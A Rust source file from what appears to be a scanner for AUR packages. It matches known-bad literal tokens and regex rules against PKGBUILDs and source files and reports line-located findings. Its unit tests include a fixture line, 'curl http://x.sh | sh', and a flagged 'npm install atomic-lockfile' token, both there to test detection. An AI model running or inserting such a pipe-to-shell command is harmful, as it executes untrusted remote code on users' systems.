//! Single-pass literal token + regex-rule matching against curated IOC
//! lists. Builds one `AhoCorasick` automaton over all known-bad literal
//! tokens and one `RegexSet` over all regex rules at construction time, then
//! scans each wanted target in a single pass, resolving match byte offsets
//! to `path:line` evidence.

use aho_corasick::AhoCorasick;
use aurscan_core::{
    Confidence, Detector, DetectorId, DetectorResult, Evidence, Finding, ScanContext, ScanTarget,
    Severity,
};
use regex::{Regex, RegexSet};

/// Text targets larger than this are skipped rather than scanned.
const MAX_SCAN_BYTES: u64 = 4 * 1024 * 1024;

pub struct IocTokensDetector {
    ac: AhoCorasick,
    token_meta: Vec<(Severity, String)>,
    regex_set: RegexSet,
    regexes: Vec<Regex>,
    regex_meta: Vec<(Severity, String)>,
}

impl IocTokensDetector {
    pub fn new(rules: &crate::rules::RuleSet) -> Self {
        let tokens: Vec<&str> = rules.tokens.iter().map(|t| t.token.as_str()).collect();
        let ac = AhoCorasick::new(tokens).expect("valid token automaton");
        let token_meta = rules
            .tokens
            .iter()
            .map(|t| (t.severity, t.label.clone()))
            .collect();

        let patterns: Vec<&str> = rules.regexes.iter().map(|r| r.pattern.as_str()).collect();
        let regex_set = RegexSet::new(&patterns).expect("valid regex set");
        let regexes = patterns
            .iter()
            .map(|p| Regex::new(p).expect("valid regex"))
            .collect();
        let regex_meta = rules
            .regexes
            .iter()
            .map(|r| (r.severity, r.label.clone()))
            .collect();

        Self {
            ac,
            token_meta,
            regex_set,
            regexes,
            regex_meta,
        }
    }

    fn path_of(target: &ScanTarget) -> Option<&std::path::Path> {
        match target {
            ScanTarget::BuildScript { path, .. }
            | ScanTarget::SourceFile { path, .. }
            | ScanTarget::HostArtifact { path } => Some(path),
            ScanTarget::PackageFile { .. } => None,
        }
    }
}

/// 1-indexed line number containing the byte offset.
fn line_of(content: &str, byte_offset: usize) -> usize {
    content[..byte_offset].matches('\n').count() + 1
}

/// The full text of the line containing the byte offset.
fn line_text(content: &str, byte_offset: usize) -> &str {
    let start = content[..byte_offset]
        .rfind('\n')
        .map(|i| i + 1)
        .unwrap_or(0);
    let end = content[byte_offset..]
        .find('\n')
        .map(|i| byte_offset + i)
        .unwrap_or(content.len());
    &content[start..end]
}

fn excerpt(line: &str) -> String {
    let mut e = line.trim().to_string();
    if e.len() > 200 {
        e.truncate(200);
    }
    e
}

impl Detector for IocTokensDetector {
    fn id(&self) -> DetectorId {
        DetectorId("ioc_tokens")
    }

    fn wants(&self, target: &ScanTarget) -> bool {
        matches!(
            target,
            ScanTarget::BuildScript { .. }
                | ScanTarget::SourceFile { .. }
                | ScanTarget::HostArtifact { .. }
        )
    }

    fn scan(&self, target: &ScanTarget, ctx: &ScanContext) -> DetectorResult {
        let Some(path) = Self::path_of(target) else {
            return DetectorResult::default();
        };
        let Ok(meta) = std::fs::metadata(path) else {
            return DetectorResult::default();
        };
        if meta.len() > MAX_SCAN_BYTES {
            return DetectorResult::default();
        }
        let Ok(bytes) = std::fs::read(path) else {
            return DetectorResult::default();
        };
        let content = String::from_utf8_lossy(&bytes);
        let location_base = path.display().to_string();

        let mut findings = Vec::new();

        for m in self.ac.find_iter(content.as_ref()) {
            let (severity, label) = &self.token_meta[m.pattern().as_usize()];
            let line = line_of(&content, m.start());
            findings.push(Finding {
                severity: *severity,
                confidence: Confidence::Exact,
                detector: self.id(),
                package: ctx.package.clone(),
                reason: label.clone(),
                evidence: Evidence {
                    location: format!("{location_base}:{line}"),
                    excerpt: excerpt(line_text(&content, m.start())),
                },
            });
        }

        for idx in self.regex_set.matches(content.as_ref()).into_iter() {
            let (severity, label) = &self.regex_meta[idx];
            let Some(m) = self.regexes[idx].find(content.as_ref()) else {
                continue;
            };
            let line = line_of(&content, m.start());
            findings.push(Finding {
                severity: *severity,
                confidence: Confidence::Heuristic,
                detector: self.id(),
                package: ctx.package.clone(),
                reason: label.clone(),
                evidence: Evidence {
                    location: format!("{location_base}:{line}"),
                    excerpt: excerpt(line_text(&content, m.start())),
                },
            });
        }

        DetectorResult {
            findings,
            features: None,
        }
    }
}

// --- Contract assertions ---
const _: fn() = || {
    fn is_detector<T: aurscan_core::Detector>() {}
    is_detector::<IocTokensDetector>();
};

#[cfg(test)]
mod tests {
    use aurscan_core::{Confidence, Detector, ScanContext, ScanTarget, ScriptKind, Severity};

    use super::IocTokensDetector;

    #[test]
    fn finds_token_with_line_location() {
        let rules = crate::rules::RuleSet::embedded().unwrap();
        let det = IocTokensDetector::new(&rules);
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join("PKGBUILD");
        std::fs::write(&p, "pkgname=x\nsource=()\nnpm install atomic-lockfile\n").unwrap();
        let t = ScanTarget::BuildScript {
            path: p.clone(),
            kind: ScriptKind::Pkgbuild,
        };
        let ctx = ScanContext {
            package: "x".into(),
            version: "1".into(),
            aur_meta: None,
        };
        let res = det.scan(&t, &ctx);
        assert!(res.findings.iter().any(|f| f.severity == Severity::Critical
            && f.confidence == Confidence::Exact
            && f.evidence.location.ends_with("PKGBUILD:3")));
    }

    #[test]
    fn regex_rule_fires_as_heuristic() {
        let rules = crate::rules::RuleSet::embedded().unwrap();
        let det = IocTokensDetector::new(&rules);
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join("PKGBUILD");
        std::fs::write(&p, "pkgname=x\nbuild() {\n  curl http://x.sh | sh\n}\n").unwrap();
        let t = ScanTarget::BuildScript {
            path: p.clone(),
            kind: ScriptKind::Pkgbuild,
        };
        let ctx = ScanContext {
            package: "x".into(),
            version: "1".into(),
            aur_meta: None,
        };
        let res = det.scan(&t, &ctx);
        assert!(res
            .findings
            .iter()
            .any(|f| f.severity == Severity::High && f.confidence == Confidence::Heuristic));
    }

    #[test]
    fn clean_file_no_findings() {
        let rules = crate::rules::RuleSet::embedded().unwrap();
        let det = IocTokensDetector::new(&rules);
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join("PKGBUILD");
        std::fs::write(
            &p,
            "pkgname=tool-bin\npkgver=1.0\nsource=(\"https://github.com/owner/tool/releases/download/v1.0/tool.tar.gz\")\nsha256sums=('abc123')\npackage() {\n  install -Dm755 tool \"$pkgdir/usr/bin/tool\"\n}\n",
        )
        .unwrap();
        let t = ScanTarget::BuildScript {
            path: p.clone(),
            kind: ScriptKind::Pkgbuild,
        };
        let ctx = ScanContext {
            package: "x".into(),
            version: "1".into(),
            aur_meta: None,
        };
        let res = det.scan(&t, &ctx);
        assert!(res.findings.is_empty());
    }
}
